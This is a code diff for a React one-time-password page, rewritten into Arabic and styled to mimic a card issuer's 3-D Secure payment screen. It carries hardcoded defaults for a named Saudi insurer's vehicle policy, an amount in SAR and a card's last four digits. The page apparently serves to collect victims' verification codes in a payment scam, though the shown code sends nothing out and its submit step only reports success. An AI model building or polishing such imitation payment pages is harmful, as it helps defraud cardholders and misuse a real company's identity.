@@ -1,35 +1,25 @@
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
-import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { useToast } from "@/hooks/use-toast";
-import Footer from "@/components/Footer";
+import {
+  Accordion,
+  AccordionContent,
+  AccordionItem,
+  AccordionTrigger,
+} from "@/components/ui/accordion";
 
 const OtpVerification = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
   const { toast } = useToast();
   
-  const companyName = searchParams.get("company") || "";
-  const price = searchParams.get("price") || "0";
-  const cardLast4 = searchParams.get("cardLast4") || "";
+  const companyName = searchParams.get("company") || "شركة الاتحاد للتأمين التعاوني - تأمين على المركبات ضد الغير";
+  const price = searchParams.get("price") || "411.15";
+  const cardLast4 = searchParams.get("cardLast4") || "6636";
 
   const [otp, setOtp] = useState("");
   const [isLoading, setIsLoading] = useState(false);
-  const [countdown, setCountdown] = useState(119); // 1:59 in seconds
-
-  useEffect(() => {
-    if (countdown > 0) {
-      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
-      return () => clearTimeout(timer);
-    }
-  }, [countdown]);
-
-  const formatTime = (seconds: number) => {
-    const mins = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    return `${mins}:${secs.toString().padStart(2, '0')}`;
-  };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -52,114 +42,145 @@ const OtpVerification = () => {
         title: "تم التحقق بنجاح",
         description: "تم إتمام عملية الدفع بنجاح",
       });
-      // Here you would navigate to a success page
-      // navigate("/payment-success");
     }, 1500);
   };
 
   const handleResendCode = () => {
-    setCountdown(119);
     toast({
       title: "تم إعادة الإرسال",
       description: "تم إرسال رمز تحقق جديد إلى هاتفك",
     });
   };
 
+  const currentTime = new Date().toLocaleString('ar-SA', { 
+    day: '2-digit', 
+    month: '2-digit', 
+    year: 'numeric',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+    hour12: false
+  });
+
   return (
-    <div className="min-h-screen bg-background flex flex-col">
-      {/* Header */}
-      <div className="border-b border-border py-4 px-6">
-        <div className="max-w-4xl mx-auto flex items-center justify-between">
-          <div className="flex gap-2">
-            <button
-              onClick={() => navigate(-1)}
-              className="text-sm text-foreground hover:underline"
-            >
-              Cancel
-            </button>
-            <button
-              className="text-sm bg-[#0d5fb3] hover:bg-[#0a4d94] text-white px-3 py-1 rounded"
-            >
-              SECURE
-            </button>
+    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4" dir="rtl">
+      <div className="w-full max-w-2xl bg-white border border-gray-300 rounded-lg shadow-sm p-6 animate-fade-in">
+        {/* Cancel Button */}
+        <div className="text-left mb-4">
+          <button
+            onClick={() => navigate(-1)}
+            className="text-gray-600 hover:underline text-sm"
+          >
+            إلغاء
+          </button>
+        </div>
+
+        {/* Card Image */}
+        <div className="flex justify-center mb-4">
+          <img 
+            src="/placeholder.svg" 
+            alt="Card" 
+            className="w-24 h-16 object-contain"
+          />
+        </div>
+
+        {/* Divider */}
+        <hr className="my-4 border-gray-400" />
+
+        {/* Language Switch */}
+        <div className="text-left mb-4">
+          <a href="#" className="text-sm text-[#4b6e8c] underline">
+            English
+          </a>
+        </div>
+
+        {/* Title */}
+        <h1 className="text-2xl font-bold text-black mb-4">
+          التحقق من عملية الدفع
+        </h1>
+
+        {/* Description */}
+        <p className="mb-4 text-gray-700">
+          يرجى ادخال رمز التحقق المُرسل إلى الرقم المسجل لإتمام عملية الشراء من :
+        </p>
+
+        {/* Payment Details */}
+        <div className="space-y-1 mb-4 text-sm">
+          <div>
+            <span className="font-bold">المتجر</span>: <span>{companyName}</span>
           </div>
-          <div className="flex items-center gap-2">
-            <img src="/placeholder.svg" alt="Secure" className="h-6" />
+          <div>
+            <span className="font-bold">المبلغ</span>: <span dir="ltr">{price} SAR</span>
+          </div>
+          <div>
+            <span className="font-bold">الوقت</span>: <span>{currentTime}</span>
           </div>
         </div>
-      </div>
 
-      {/* Main Content */}
-      <div className="flex-1 flex items-center justify-center px-4 py-12">
-        <div className="w-full max-w-md">
-          <h1 className="text-2xl font-bold text-center text-foreground mb-6">
-            Verify By Phone
-          </h1>
-          
-          <p className="text-center text-muted-foreground mb-6 text-sm leading-relaxed">
-            We have sent you a text message with a code to your registered mobile number.
-          </p>
+        <div className="font-bold text-black mb-6">
+          تسوّق ممتع!
+        </div>
 
-          <div className="text-center text-sm text-muted-foreground mb-8 leading-relaxed">
-            <p className="mb-2">
-              the amount of <span className="text-foreground">تأمين على المركبات ضد الغير - التأميني التعاوني - شركة الاتحاد {companyName}</span> You are paying{" "}
-            </p>
-            <p>
-              <span className="font-semibold text-foreground">SAR {price}</span> on{" "}
-              {new Date().toLocaleString('en-GB', { 
-                day: '2-digit', 
-                month: '2-digit', 
-                year: 'numeric',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit',
-                hour12: false
-              }).replace(',', '')}
-            </p>
+        {/* OTP Form */}
+        <form onSubmit={handleSubmit} className="space-y-6">
+          <div>
+            <div className="text-center text-gray-600 mb-2 text-sm">
+              رمز التحقق
+            </div>
+            <Input
+              type="text"
+              maxLength={6}
+              value={otp}
+              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
+              className="w-full text-center text-lg tracking-widest py-2 outline-none border-0 border-b-2 border-gray-300 focus-visible:ring-0 focus-visible:border-gray-600 rounded-none"
+              placeholder=""
+              dir="ltr"
+            />
           </div>
 
-          <form onSubmit={handleSubmit} className="space-y-6">
-            <div className="space-y-2">
-              <label className="block text-sm font-medium text-foreground text-right">
-                Verification code
-              </label>
-              <Input
-                type="text"
-                maxLength={6}
-                value={otp}
-                onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
-                className="w-full h-12 text-center text-lg tracking-widest border-input"
-                placeholder=""
-              />
-            </div>
+          <button
+            type="submit"
+            className="w-full py-3 bg-[#2900fc] hover:bg-[#2200cc] text-white font-medium transition-colors rounded"
+            disabled={isLoading || otp.length !== 6}
+          >
+            {isLoading ? "جاري التحقق..." : "تأكيد"}
+          </button>
+        </form>
 
-            <Button
-              type="submit"
-              className="w-full h-12 text-base bg-[#6b9cf5] hover:bg-[#5a8ae4] text-white rounded-md"
-              disabled={isLoading || otp.length !== 6}
-            >
-              {isLoading ? "جاري التحقق..." : "CONFIRM"}
-            </Button>
+        {/* Resend Code */}
+        <div className="mt-12 text-center">
+          <button
+            type="button"
+            onClick={handleResendCode}
+            className="text-[#2900fc] hover:underline"
+          >
+            إعادة إرسال الرمز
+          </button>
+        </div>
 
-            <div className="text-center text-sm text-muted-foreground">
-              يمكنك إعادة إرسال الرمز بعد {formatTime(countdown)}
-            </div>
-          </form>
-
-          <div className="mt-8 pt-6 space-y-3">
-            <button className="w-full text-center text-sm text-[#4a90e2] hover:text-[#357abd] flex items-center justify-center gap-1">
-              <span>+</span>
-              <span>Learn more about authentication</span>
-            </button>
-            <button className="w-full text-center text-sm text-[#4a90e2] hover:text-[#357abd] flex items-center justify-center gap-1">
-              <span>+</span>
-              <span>Need some help ?</span>
-            </button>
-          </div>
+        {/* Help Accordion */}
+        <div className="mt-12">
+          <Accordion type="single" collapsible className="space-y-2">
+            <AccordionItem value="auth" className="border-none">
+              <AccordionTrigger className="text-[#2900fc] hover:no-underline text-right">
+                تعرف على المزيد حول المصادقة
+              </AccordionTrigger>
+              <AccordionContent className="text-black text-sm">
+                يرجى الاتصال بخدمة العملاء على : 8001000081
+              </AccordionContent>
+            </AccordionItem>
+            
+            <AccordionItem value="help" className="border-none">
+              <AccordionTrigger className="text-[#2900fc] hover:no-underline text-right">
+                بحاجة لبعض المساعدة ؟
+              </AccordionTrigger>
+              <AccordionContent className="text-black text-sm">
+                يرجى الاتصال بخدمة العملاء على : 8001000081
+              </AccordionContent>
+            </AccordionItem>
+          </Accordion>
         </div>
       </div>
-
-      <Footer />
     </div>
   );
 };
